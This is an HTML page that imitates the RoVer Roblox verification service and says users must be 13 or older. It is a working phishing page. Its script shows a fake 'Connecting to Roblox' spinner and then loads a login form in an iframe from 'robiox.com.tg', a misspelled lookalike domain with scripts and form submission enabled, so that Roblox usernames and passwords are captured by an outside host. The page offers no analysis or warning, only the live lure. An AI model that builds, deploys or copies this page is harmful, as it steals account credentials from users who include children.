
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RoVer - Roblox Verification</title>
    <link rel="icon" href="https://rover.link/favicon.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
            background: #000000;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            background: #d61f69;
            padding: 15px 0;
            box-shadow: 0 2px 8px rgba(0,0,0,0.3);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .header-content {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
            color: white;
            font-size: 36px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }

        .logo-icon {
            width: 45px;
            height: 45px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo-icon svg {
            width: 100%;
            height: 100%;
            fill: white;
        }

        .main-content {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }

        .verification-card {
            background: #1a1a1a;
            border-radius: 16px;
            padding: 50px 40px;
            max-width: 480px;
            width: 100%;
            text-align: center;
            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
        }

        h1 {
            color: white;
            font-size: 32px;
            font-weight: 600;
            margin-bottom: 20px;
        }

        .age-requirement {
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 30px;
        }

        .age-requirement p {
            color: #b0b0b0;
            font-size: 15px;
            line-height: 1.5;
        }

        .verify-button {
            background: #d61f69;
            color: white;
            border: none;
            padding: 18px 40px;
            border-radius: 30px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            box-shadow: 0 4px 12px rgba(214, 31, 105, 0.3);
        }

        .verify-button:hover {
            background: #c01b5e;
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(214, 31, 105, 0.4);
        }

        .verify-button:active {
            transform: translateY(0);
        }

        .verify-button:disabled {
            background: #4f4f4f;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .roblox-icon {
            width: 24px;
            height: 24px;
        }

        .footer {
            background: #0a0a0a;
            padding: 40px 20px;
            text-align: center;
            border-top: 1px solid rgba(255,255,255,0.05);
        }

        .footer-content {
            max-width: 1200px;
            margin: 0 auto;
        }

        .footer-logo {
            margin-bottom: 20px;
        }

        .footer-logo-text {
            font-family: 'Brush Script MT', cursive;
            font-size: 48px;
            font-weight: 400;
            background: linear-gradient(135deg, #d61f69 0%, #ff4081 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            line-height: 1.2;
        }

        .footer-logo-sub {
            font-family: 'Brush Script MT', cursive;
            font-size: 32px;
            color: #d61f69;
            margin-top: -10px;
        }

        .footer-text {
            color: rgba(255,255,255,0.4);
            font-size: 13px;
            margin-top: 15px;
        }

        .loading {
            display: none;
            margin-top: 20px;
        }

        .loading.active {
            display: block;
        }

        .spinner {
            border: 3px solid rgba(255,255,255,0.1);
            border-top: 3px solid #d61f69;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }

        .loading p {
            color: #b0b0b0;
            font-size: 14px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (max-width: 600px) {
            .verification-card {
                padding: 40px 30px;
            }

            h1 {
                font-size: 28px;
            }

            .logo {
                font-size: 30px;
            }

            .footer-logo-text {
                font-size: 36px;
            }

            .footer-logo-sub {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <div class="logo">
                <div class="logo-icon">
                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 2L2 7L12 12L22 7L12 2Z"/>
                        <path d="M2 17L12 22L22 17V12L12 17L2 12V17Z"/>
                    </svg>
                </div>
                <span>RoVer</span>
            </div>
        </div>
    </div>

    <div class="main-content">
        <div class="verification-card">
            <h1>Sign in to RoVer</h1>
            
            <div class="age-requirement">
                <p>You must be 13 years of age or older to continue.</p>
            </div>

            <button class="verify-button" id="verifyBtn">
                <svg class="roblox-icon" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M18.279 3.272L3.272 18.279l2.448 2.448L20.727 5.72z"/>
                </svg>
                Log in with Roblox
            </button>

            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p>Connecting to Roblox...</p>
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="footer-content">
            <div class="footer-logo">
                <div class="footer-logo-text">IMAGINARY</div>
                <div class="footer-logo-sub">Menagerie</div>
            </div>
            <p class="footer-text">Â© 2025 Imaginary Menagerie, LLC.</p>
        </div>
    </div>

    <script>
        const verifyBtn = document.getElementById('verifyBtn');
        const loading = document.getElementById('loading');
        const verificationCard = document.querySelector('.verification-card');

        verifyBtn.addEventListener('click', () => {
            // Show loading state
            verifyBtn.style.display = 'none';
            loading.classList.add('active');

            // After short delay, show the embedded Roblox login
            setTimeout(() => {
                loading.classList.remove('active');
                
                // Replace card content with iframe
                verificationCard.innerHTML = `
                    <h1>Login to Roblox</h1>
                    <div style="width: 100%; height: 700px; border-radius: 12px; overflow: hidden; background: #2a2a2a;">
                        <iframe 
                            src="https://www.robiox.com.tg/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F484235491836%2Fprofile" 
                            style="width: 100%; height: 100%; border: none; border-radius: 12px;"
                            allow="payment; microphone; camera"
                            sandbox="allow-same-origin allow-scripts allow-forms allow-popups"
                        ></iframe>
                    </div>
                `;
                
                // Expand the card to fit the iframe better
                verificationCard.style.maxWidth = '700px';
                verificationCard.style.padding = '30px';
            }, 1500);
        });
    </script>
</body>
</html>
